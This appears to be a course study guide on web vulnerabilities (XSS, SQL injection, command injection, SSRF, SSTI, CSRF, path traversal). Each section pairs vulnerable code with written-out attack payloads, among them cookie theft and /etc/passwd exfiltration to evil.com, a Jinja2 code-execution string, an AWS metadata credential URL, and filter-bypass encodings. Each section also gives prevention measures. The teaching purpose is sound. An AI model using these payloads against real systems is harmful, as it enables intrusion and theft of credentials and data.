# 6. Web Security Vulnerabilities - Complete Guide

## Overview
**VERY COMMON** - especially matching questions (2023 Q5). You must **recognize attacks from examples** and explain each vulnerability type.

---

## 6.1 XSS (Cross-Site Scripting)

### Definition
Attacker injects malicious JavaScript that executes in victim's browser within the context of the vulnerable website.

### Types

#### Reflected XSS
Payload in URL/request, reflected immediately in response.

**Example 1:**
```
Vulnerable code:
<h1>Search results for: <?php echo $_GET['q']; ?></h1>

Attack URL:
http://site.com/search?q=<script>alert(document.cookie)</script>

Rendered HTML:
<h1>Search results for: <script>alert(document.cookie)</script></h1>

Script executes in victim's browser, steals cookies!
```

#### Stored XSS
Payload stored in database, served to all users.

**Example 2:**
```
Vulnerable blog comment form:
User submits: <script>fetch('http://evil.com/?c='+document.cookie)</script>

Stored in database as-is.

Every visitor loads comment → script executes → cookies stolen

More dangerous than reflected (affects many users)
```

#### DOM-based XSS
Payload manipulates DOM without server involvement.

**Example 3:**
```javascript
// Vulnerable JavaScript
const name = location.hash.substring(1);
document.write("Hello " + name);

Attack URL:
http://site.com/#<img src=x onerror=alert(document.cookie)>

Client-side only, never reaches server logs!
```

### Impact
```
- Steal session cookies/tokens
- Perform actions as victim (CSRF)
- Redirect to phishing site
- Inject keyloggers
- Deface website
```

### Prevention
```
✅ Escape output: htmlspecialchars() in PHP, {{ var }} in templates
✅ Content Security Policy (CSP) headers
✅ HttpOnly flag on cookies (prevents JavaScript access)
✅ Input validation (whitelist, not blacklist)
❌ Never use innerHTML with user input
❌ Never execute user data as code
```

**Example Prevention:**
```php
// ❌ Vulnerable
echo "<h1>" . $_GET['name'] . "</h1>";

// ✅ Safe
echo "<h1>" . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</h1>";

// Converts: <script> → &lt;script&gt; (displayed as text, not executed)
```

---

## 6.2 SQL Injection

### Definition
Attacker manipulates SQL queries by injecting malicious SQL code through user input.

### Example 4: Authentication Bypass
```php
// Vulnerable code
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

// Attack input:
username: admin' --
password: (anything)

// Resulting query:
SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
//                                      ↑
//                           Comment out password check

// Result: Logged in as admin without knowing password!
```

### Example 5: Data Extraction (Union Attack)
```sql
-- Original query:
SELECT name, price FROM products WHERE id = $_GET['id']

-- Attack payload: 1' UNION SELECT username, password FROM users --

-- Resulting query:
SELECT name, price FROM products WHERE id = '1' 
UNION SELECT username, password FROM users -- '

-- Result: Returns product data + all usernames and passwords!
```

### Example 6: Blind SQL Injection
```sql
-- Application only shows "valid" or "invalid", no data
-- Attack to extract admin password character by character:

-- Test if first character is 'a':
admin' AND SUBSTRING(password,1,1)='a' --
→ Invalid

-- Test if first character is 'b':
admin' AND SUBSTRING(password,1,1)='b' --
→ Valid! First char is 'b'

-- Continue for each character...
-- Time-consuming but works when no output returned
```

### Example 7: Command Injection (SQL)
```sql
-- Some databases allow command execution
-- MSSQL: xp_cmdshell
-- PostgreSQL: COPY TO PROGRAM

Attack payload:
'; EXEC xp_cmdshell('whoami'); --

Resulting in:
SELECT * FROM users WHERE id = 1; EXEC xp_cmdshell('whoami'); --

Result: Executes OS command on database server!
```

### Prevention
```
✅ Prepared statements / Parameterized queries (BEST)
✅ ORM (SQLAlchemy, Hibernate)
✅ Escape special characters (backup, not primary)
✅ Least privilege (database user has minimal permissions)
❌ Never build queries with string concatenation
❌ Don't trust client-side validation
```

**Example Prevention:**
```php
// ❌ Vulnerable
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// ✅ Safe (Prepared Statement)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);

// or with named parameters:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);

// SQL engine treats input as DATA, never as CODE
```

---

## 6.3 Command Injection

### Definition
Attacker executes arbitrary OS commands by injecting shell metacharacters.

### Example 8: Simple Command Injection
```php
// Vulnerable code: ping utility
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);

// Attack input:
ip: 8.8.8.8; cat /etc/passwd

// Resulting command:
ping -c 4 8.8.8.8; cat /etc/passwd

// Executes ping, then displays password file!
```

### Example 9: Blind Command Injection
```php
// No output shown to user
$ip = $_GET['ip'];
system("ping -c 4 " . $ip . " > /dev/null");

// Attack with time delay:
ip: 8.8.8.8; sleep 10

// If response takes 10 extra seconds → command injection confirmed!

// Exfiltrate data via DNS/HTTP:
ip: 8.8.8.8; curl http://evil.com/?data=$(cat /etc/passwd | base64)
```

### Shell Metacharacters
```
;  - Command separator
|  - Pipe output
&  - Background execution
&& - Execute if previous succeeds
|| - Execute if previous fails
`  - Command substitution (backticks)
$() - Command substitution
\n - Newline (command separator)
```

### Example 10: Advanced Bypass
```
Input filtering: blocks ; | & 

Bypass with newline:
ip: 8.8.8.8%0Acat /etc/passwd
(%0A is URL-encoded newline)

Resulting command:
ping -c 4 8.8.8.8
cat /etc/passwd
```

### Prevention
```
✅ Avoid system calls entirely (use libraries/APIs)
✅ Whitelist validation (only allow IP format: \d{1,3}\.\d{1,3}...)
✅ escapeshellarg() / escapeshellcmd() in PHP
✅ Run with minimal privileges
❌ Never pass user input to shell
❌ Blacklists don't work (too many bypass techniques)
```

---

## 6.4 SSRF (Server-Side Request Forgery)

### Definition
Attacker makes server send requests to unintended locations, often internal resources.

### Example 11: Basic SSRF
```php
// Vulnerable code: Image fetcher
$url = $_GET['url'];
$image = file_get_contents($url);
header('Content-Type: image/png');
echo $image;

// Attack: Access internal services
url: http://localhost:6379/
→ Connects to internal Redis server

url: http://192.168.1.1/admin
→ Accesses internal admin panel (bypasses firewall!)

url: file:///etc/passwd
→ Reads local files
```

### Example 12: Cloud Metadata Attack
```
// AWS EC2 instance has metadata service at:
http://169.254.169.254/latest/meta-data/

// Attack:
url: http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

// Returns AWS access keys!
// Attacker can now access AWS resources as that role
```

### Prevention
```
✅ Whitelist allowed domains/IPs
✅ Disable redirects (prevent open redirect chains)
✅ Block internal IP ranges (127.0.0.1, 192.168.x.x, 169.254.x.x)
✅ Use network segmentation
❌ Don't fetch arbitrary URLs from user input
❌ URL parsing can be tricky (many bypass techniques)
```

---

## 6.5 SSTI (Server-Side Template Injection)

### Definition
Attacker injects malicious code into template expressions, executed on server.

### Example 13: SSTI in Python (Jinja2)
```python
# Vulnerable code
from flask import Flask, request, render_template_string

@app.route('/')
def index():
    name = request.args.get('name', 'World')
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)

# Attack payload:
name: {{7*7}}
→ Renders: <h1>Hello 49!</h1>  (template executed!)

# Remote Code Execution:
name: {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
→ Executes OS command and returns output!
```

### Example 14: SSTI Detection
```
Test payloads to identify template engine:

{{7*7}} = 49          → Jinja2, Twig
${7*7} = 49           → Freemarker, Velocity
<%= 7*7 %> = 49       → ERB (Ruby)
#{7*7} = 49           → Thymeleaf

If math evaluates → SSTI exists!
```

### Prevention
```
✅ Never use user input in template strings
✅ Use pre-compiled templates
✅ Sandbox template execution (if available)
✅ Escape all user output
❌ render_template_string() with user input
❌ Eval-like functions in templates
```

---

## 6.6 CSRF (Cross-Site Request Forgery)

### Definition
Attacker tricks victim's browser into making unwanted requests to a site where victim is authenticated.

### Example 15: CSRF Attack
```html
<!-- Attacker's evil.com page -->
<form action="https://bank.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>
  document.getElementById('csrf').submit();
</script>

<!-- When victim visits evil.com while logged into bank.com:
     1. Form auto-submits
     2. Browser includes bank.com cookies (victim is authenticated)
     3. Transfer executes as the victim
     4. Money stolen! -->
```

### Example 16: GET-based CSRF
```html
<!-- Attacker embeds image -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- Browser automatically sends GET request with cookies
     If bank uses GET for state-changing operations → CSRF succeeds -->
```

### Prevention
```
✅ CSRF tokens (random value per session/request)
✅ SameSite cookie attribute
✅ Check Referer header
✅ Require re-authentication for sensitive actions
❌ Don't use GET for state changes
❌ Cookies alone don't prevent CSRF
```

**Example Prevention:**
```php
// ❌ Vulnerable
if ($_POST['amount']) {
    transfer_money($_SESSION['user'], $_POST['to'], $_POST['amount']);
}

// ✅ Protected
if ($_POST['amount'] && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    transfer_money($_SESSION['user'], $_POST['to'], $_POST['amount']);
} else {
    die('CSRF token mismatch!');
}
```

---

## 6.7 Directory Traversal / Path Traversal

### Definition
Attacker accesses files outside intended directory by manipulating file paths.

### Example 17: Path Traversal
```php
// Vulnerable code: File viewer
$file = $_GET['file'];
include("/var/www/files/" . $file);

// Attack payload:
file: ../../../../etc/passwd

// Resulting path:
/var/www/files/../../../../etc/passwd
= /etc/passwd

// Displays password file!
```

### Example 18: Bypass Filters
```
// Filter: blocks ../
// Bypass with URL encoding:
file: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

// Filter: removes ../
// Bypass with double encoding:
file: ....//....//....//etc/passwd
(after removal: ../../../etc/passwd)

// Filter: requires .txt extension
// Bypass with null byte (old PHP versions):
file: ../../../../etc/passwd%00.txt
(null byte truncates, reads /etc/passwd)
```

### Prevention
```
✅ Whitelist allowed files (best)
✅ Normalize and validate paths (realpath())
✅ Use file IDs instead of names
✅ Chroot jail
❌ Don't use user input in file paths
❌ Blacklists fail (many encoding tricks)
```

---

## 🎯 Exam Tips for Web Vulnerabilities

### Recognition Patterns (for matching questions)

```
XSS:
- <script> tags in output
- JavaScript execution
- Cookie theft
- Keywords: alert(), document.cookie

SQL Injection:
- ' or 1=1 --
- UNION SELECT
- ; DROP TABLE
- Keywords: admin' --, OR, UNION

Command Injection:
- ; cat /etc/passwd
- | whoami
- && curl
- Keywords: shell metacharacters

SSRF:
- http://localhost
- http://169.254.169.254
- file:///
- Keywords: internal IPs, metadata

SSTI:
- {{7*7}}
- ${7*7}
- <%= %>
- Keywords: template syntax

CSRF:
- Auto-submitting forms
- Image tags with sensitive URLs
- No token validation
- Keywords: cross-site, authenticated

Path Traversal:
- ../../../
- ..%2f..%2f
- %00 (null byte)
- Keywords: file paths, directory
```

### Question Patterns

**"Identify the vulnerability:"**
Look for:
- User input not validated/escaped
- Special characters in output
- Database queries with concatenation
- System calls with user input

**"How would you fix this?"**
Always mention:
- Specific function (htmlspecialchars, prepared statements)
- WHY it works (input as data not code)
- Additional defenses (CSP, least privilege)

---

## 📝 Quick Reference

```
XSS: Inject JavaScript → Execute in victim's browser
Prevention: Escape output, CSP headers

SQL Injection: Manipulate queries → Bypass auth, extract data
Prevention: Prepared statements, never concatenate

Command Injection: Execute OS commands → Full system compromise
Prevention: Avoid system calls, whitelist validation

SSRF: Make server request internal resources → Access internal services
Prevention: Whitelist URLs, block internal IPs

SSTI: Inject template code → RCE on server
Prevention: Don't use user input in templates

CSRF: Trick authenticated user → Perform unwanted actions
Prevention: CSRF tokens, SameSite cookies

Path Traversal: Access files outside directory → Read sensitive files
Prevention: Whitelist files, validate paths
```

---

[← Previous: Buffer Overflow](./05-buffer-overflow.md) | [Next: Fuzzing →](./07-fuzzing.md)
